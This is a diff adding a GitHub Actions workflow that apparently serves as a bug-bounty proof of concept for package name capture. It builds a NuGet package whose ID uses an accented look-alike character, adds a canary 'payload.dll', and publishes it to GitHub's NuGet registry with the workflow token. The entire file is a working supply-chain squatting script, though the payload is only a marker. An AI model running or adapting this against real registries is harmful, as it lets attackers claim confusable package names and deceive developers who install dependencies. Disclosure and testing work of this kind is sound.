@@ -1,0 +1,61 @@
+name: h1-package-name-capture
+on:
+  push:
+    branches:
+      - h1-video-ff47ef
+permissions:
+  contents: read
+  packages: write
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Publish the accented package with this repository's GITHUB_TOKEN
+        env:
+          PACKAGE_ID: H1Video.Órderff47ef
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import os, zipfile
+
+          package_id = os.environ["PACKAGE_ID"]
+          run_id = os.environ["GITHUB_RUN_ID"]
+          repository = os.environ["GITHUB_REPOSITORY"]
+          canary = "H1-ATTACKER-RUN-" + run_id
+          nuspec = (
+              '<?xml version="1.0" encoding="utf-8"?>'
+              '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd"><metadata>'
+              f'<id>{package_id}</id><version>1.0.0</version><authors>attacker-workflow</authors>'
+              f'<description>{canary}, built by {repository}</description>'
+              f'<repository type="git" url="https://github.com/{repository}" />'
+              '</metadata></package>'
+          )
+          content_types = (
+              '<?xml version="1.0" encoding="utf-8"?>'
+              '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
+              '<Default Extension="nuspec" ContentType="text/xml" />'
+              '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml" />'
+              '<Default Extension="dll" ContentType="application/octet-stream" /></Types>'
+          )
+          relationships = (
+              '<?xml version="1.0" encoding="utf-8"?>'
+              '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+              f'<Relationship Type="http://schemas.microsoft.com/packaging/2010/07/manifest" '
+              f'Target="/{package_id}.nuspec" Id="R1" /></Relationships>'
+          )
+          with zipfile.ZipFile("attacker.nupkg", "w", zipfile.ZIP_DEFLATED) as archive:
+              archive.writestr(package_id + ".nuspec", nuspec)
+              archive.writestr("[Content_Types].xml", content_types)
+              archive.writestr("_rels/.rels", relationships)
+              archive.writestr("lib/netstandard2.0/payload.dll", b"MZ\x90\x00" + canary.encode())
+          print("attacker_package_id=" + package_id)
+          print("attacker_canary=" + canary)
+          PY
+
+          status=$(curl -sS -X PUT "https://nuget.pkg.github.com/${GITHUB_REPOSITORY_OWNER}/" \
+            -u "x:${TOKEN}" -H "X-NuGet-ApiKey: ${TOKEN}" -H "X-NuGet-Client-Version: 6.9.1" \
+            -F "package=@attacker.nupkg;type=application/octet-stream" -o response.txt -w '%{http_code}')
+          echo "publish_status=${status}"
+          cat response.txt
+          test "${status}" = "200"
